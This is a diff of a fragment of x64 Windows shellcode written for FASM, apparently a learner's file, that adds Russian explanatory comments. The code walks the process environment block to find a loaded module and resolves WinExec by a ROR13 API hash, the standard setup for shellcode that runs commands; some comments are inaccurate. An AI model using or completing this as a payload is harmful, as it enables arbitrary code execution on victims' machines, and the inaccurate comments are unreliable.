@@ -1,17 +1,21 @@
-format binary           ;meow / мяу
-use64                   ; 
-
+format binary           ; говорит чтоб без структур , чисто голая бинарка
+use64                   ; x64
+; meow / мяу
 shellcode_start:
-    push rbp
-    mov rbp, rsp
-    sub rsp, 60h
+    push rbp      ; push - перемещение в стек. rbp - указатель для стека
 
-    mov rbx, [gs:60h]
-    mov rbx, [rbx+18h]
-    mov rbx, [rbx+20h]
-    mov rbx, [rbx]
-    mov rbx, [rbx]
-    mov r12, [rbx+20h]
+    mov rbp, rsp  ; mov - Копирует исходный операнд. rsp - указатель стека
+    ; rsp - (ВОЗМОЖНО) указывает на адрес текущей вершины стека в оперативке
+;TCP/IP
+    sub rsp, 60h  ; sub - Вычитание/A = A - B. 60h - координата внутри самого процессора(6*16=96)
+    ; выделяет 96 байт временной памяти в стеке, (стак стаканчиков в тубусе) 
+
+    mov rbx, [gs:60h]  ; gs - Сегмент общего назначения
+    mov rbx, [rbx+18h]  ;
+    mov rbx, [rbx+20h]  ;
+    mov rbx, [rbx]   ;
+    mov rbx, [rbx]  ;
+    mov r12, [rbx+20h]  ;
 
     mov edi, 0x5E2D1A3B          ;через ROR13 делается свиг вправо на 13 бит (0x5E2D1A3B - функция WinExec)
     call get_api_by_hash         ; get_api_by_hash - вызывать можно гдеугодно это не С++
@@ -35,6 +39,8 @@ shellcode_start:
 get_api_by_hash:
     mov edx, [r12+3Ch]      ; 3Ch - h это Hex(16 ричка)/смещение внутри структуры данных
     ; 3C - (60 байт в 10 чной) 3*16=48 + C - это 12 (если в 16 ричке) а 60 - это 6 и 0
+    ; + 3Ch - это координаты внутри файлов библиотек.
+
     add rdx, r12
     mov edx, [rdx+88h]
     add  rdx, r12
